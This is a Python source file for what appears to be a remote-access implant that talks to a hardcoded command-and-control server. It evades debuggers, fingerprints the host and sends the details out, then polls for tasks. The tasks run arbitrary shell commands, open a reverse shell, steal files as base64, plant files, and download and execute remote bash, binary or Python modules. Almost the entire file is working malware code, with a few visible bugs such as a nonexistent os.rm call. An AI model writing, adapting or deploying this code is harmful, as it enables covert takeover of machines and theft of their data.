import base64
import ctypes
import multiprocessing
import os
import platform
import socket
import subprocess as sp
import threading
import time

import requests as r

# the comments are only used at the start of the project to show how they work
# they will be removed in the future
# Get the current operating system
operating_system = platform.system()

# Check if the current process is being debugged
if operating_system == 'Windows':
    # On Windows, use the IsDebuggerPresent function
    kernel32 = ctypes.WinDLL('kernel32')
    is_debugger_present = kernel32.IsDebuggerPresent
    is_debugger_present.argtypes = []
    is_debugger_present.restype = ctypes.c_bool
    if is_debugger_present():
        # If the process is being debugged, terminate it
        os._exit(0)
elif operating_system == 'Linux':
    # On Linux, check if the PT_TRACE_ME ptrace option is set
    if os.getppid() == 1:
        # If the ptrace option is set, terminate the process
        os._exit(0)
elif operating_system == 'Darwin':
    # On macOS, use the proc_pidinfo function
    proc = ctypes.CDLL('libproc.dylib')
    proc_pidinfo = proc.proc_pidinfo
    proc_pidinfo.argtypes = [ctypes.c_int, ctypes.c_int, ctypes.c_uint64]
    proc_pidinfo.restype = ctypes.c_int
    info = proc_pidinfo(os.getpid(), 1, 0)
    if info.kp_proc.p_flag & 0x8:
        # If the process is being debugged, terminate it
        os._exit(0)


time.sleep(3600)
URL = "https://1.2.3.4:5678/"

def download_file(task_name: str, file_path: str):
    with open(file_path, "wb") as f:
        f.write(r.get(URL+"download/"+task_name, verify=False).content)


def reverse_shell(address: str, port: int):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((address, int(port)))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    sp.call(["/bin/sh", "-i"])

def thread_execution(func: callable, args: tuple):
    t = threading.Thread(target=func, args=args)
    t.start()
    data["output"] = "Thread started"
    data["success"] = True

def process_execution(func: callable, args: tuple):
    p = multiprocessing.Process(target=func, args=args)
    p.start()
    data["output"] = "Process started"
    data["success"] = True

def shell_execution(cmd: str):
    sp.getoutput(cmd)
    data["output"] = "Shell command executed"
    data["success"] = True

def get_output(cmd: str):
    data["output"] = sp.getoutput(cmd)
    data["success"] = True
    
data = {
    "address": socket.gethostbyname(socket.gethostname()),
    "hostname": sp.getoutput("hostname"),
    "os": sp.getoutput("uname").lower(),
    "architecture": sp.getoutput("uname -m"),
    "user": sp.getoutput("whoami"),
    "admin": os.getuid() == 0,
    "stager": 1234,
}
name = r.post(f"{URL}/connect", json=data, verify=False).json()["name"]

i = 0
while i < 3600:
    time.sleep(3600)
    try:
        tasks = r.get(URL + "/tasks/" + name, verify=False)
    except:
        i += 1
        continue
    tasks = tasks.json()
    for task in tasks:
        try:
            data = {
                "task": task["id"],
                "success": True
            }
            if task["type"] == "rce":
                data["output"] = sp.getoutput(task["args"]["cmd"])
            elif task["type"] == "dir":
                data["output"] = sp.getoutput("ls " + task["args"]["dir"])
            elif task["type"] == "reverse-shell":
                multiprocessing.Process(target=reverse_shell, args=(
                    task["args"]["address"], task["args"]["port"])).start()
                data["output"] = "Send reverse shell"
            elif task["type"] == "upload":
                try:
                    download_file(task["name"], task["args"]["target_path"])
                except Exception as e:
                    data["success"] = False
                    data["output"] = str(e)
                else:
                    data["output"] = "Downloaded file"
            elif task["type"] == "download":
                try:
                    with open(task["args"]["target_path"], "rb") as f:
                        data["output"] = base64.b64encode(f.read()).decode()
                except Exception as e:
                    data["success"] = False
                    data["output"] = str(e)
            
            elif task["type"] == "module":
                # get module info and content
                module = r.get(URL + "/module/", params={"path": task["args"]["path"]}, verify=False).json()
                module_content = r.get(URL + "/module/download", params={"name": task["name"]}, verify=False).content
                
                code_type = module["code_type"]
                execution_method = task["args"]["execution_method"]

                if code_type == "shellcode":
                    # execute shellcode
                    data["output"] = sp.getoutput("echo " + module_content.decode() + " | base64 -d | bash")
                    data["success"] = True
                elif code_type == "compiled":
                    # write module to file
                    with open("/tmp/data.bak", "wb") as f:
                        f.write(module_content)

                    if execution_method == "direct":
                        data["output"] = sp.getoutput("/tmp/data.bak")
                        data["success"] = True
                    elif execution_method == "thread":
                        threading.Thread(target=sp.getoutput, args=("/tmp/data.bak",)).start()
                        data["output"] = "Started thread"
                        data["success"] = True
                    elif execution_method == "process":
                        multiprocessing.Process(target=sp.getoutput, args=("/tmp/data.bak",)).start()
                        data["output"] = "Started process"
                        data["success"] = True
                    else:
                        data["output"] = "Invalid execution method"
                        data["success"] = False
                    os.rm("/tmp/data.bak")
                elif module["language"] == "python":
                    if execution_method == "direct":
                        output = None
                        exec(module_content)
                        data["output"] = output
                        data["success"] = True
                    elif execution_method == "thread":
                        output = None
                        threading.Thread(target=exec, args=(module_content,)).start()
                        data["output"] = output
                        data["success"] = True
                    elif execution_method == "process":
                        multiprocessing.Process(target=exec, args=(module_content,)).start()
                        data["output"] = "Started module in process"
                        data["success"] = True
                    elif execution_method == "external":
                        with open("/tmp/save_dat01", "wb") as f:
                            f.write(module_content)
                        sp.Popen(["python3", "/tmp/save_dat01"])
                        data["output"] = "Started module in external process"
                        data["success"] = True
                        os.rm("/tmp/save_dat01")
                    else:
                        data["output"] = "Execution method not supported"
                        data["success"] = False
                elif module["language"] == "bash":
                    if execution_method == "direct":
                        data["output"] = sp.getoutput(module_content.decode())
                        data["success"] = True
                    elif execution_method == "thread":
                        output = None
                        threading.Thread(target=sp.getoutput, args=(module_content.decode(),)).start()
                        data["output"] = output
                        data["success"] = True
                    elif execution_method == "process":
                        multiprocessing.Process(target=sp.getoutput, args=(module_content.decode(),)).start()
                        data["output"] = "Started module in process"
                        data["success"] = True
                    elif execution_method == "external":
                        with open("/tmp/save_dat01", "wb") as f:
                            f.write(module_content)
                        sp.Popen(["bash", "/tmp/save_dat01"])
                        data["output"] = "Started module in external process"
                        data["success"] = True
                        os.rm("/tmp/save_dat01")
                    else:
                        data["output"] = "Execution method not supported"
                        data["success"] = False
                else:
                    data["success"] = False
                    data["output"] = "Language/Code type not supported"
            elif task["type"] == "info":
                data["output"] = {
                        "address": socket.gethostbyname(socket.gethostname()),
                        "hostname": sp.getoutput("hostname"),
                        "username": sp.getoutput("whoami"),
                        "admin": os.getuid() == 0,
                    }
                data["success"] = True
            else:
                data["success"] = False
                data["output"] = "Task type not supported."
        except Exception as e:
            data["success"] = False
            data["output"] = str(e)
        res = r.post(URL + "/finish/" + name, json=data, verify=False)
